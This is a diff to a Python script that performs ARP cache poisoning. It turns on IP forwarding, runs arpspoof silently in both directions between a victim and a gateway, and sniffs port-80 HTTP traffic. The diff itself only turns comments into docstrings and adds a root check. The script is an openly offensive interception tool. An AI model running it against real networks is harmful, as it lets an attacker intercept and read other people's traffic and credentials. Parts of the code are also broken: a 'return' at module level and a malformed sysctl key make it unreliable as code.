@@ -10,9 +10,9 @@ def check_root():
     return False
 
 def poison(iface,victim, gw):
-  # IP Forwarding
+  """ IP Forwarding """
   os.system("sysctl -w .net.ipv4.ip_forward=1 > /dev/null")
-  # ARP cache poisoning, silent, in both directions
+  """ ARP cache poisoning, silent, in both directions """
   os.system("arpspoof -i "+iface+" -t "+victim+" "+gw+" 2> /dev/null &")
   os.system("arpspoof -i "+iface+" -t "+gw+" "+victim+" 2> /dev/null &")
   print("ARP cache poisoning...")
@@ -42,6 +42,9 @@ if __name__ == '__main__':
   pc = pcap.pcap(sys.argv[1])
   pc.setfilter('tcp and port 80') # Sniff only http
   try:
+    if not check_root():
+        print 'Must be run as root.'
+        return
     print 'listening on %s' % (pc.name)
     print 'to exit, type Control-c'
     poison(sys.argv[1],sys.argv[2],sys.argv[3])
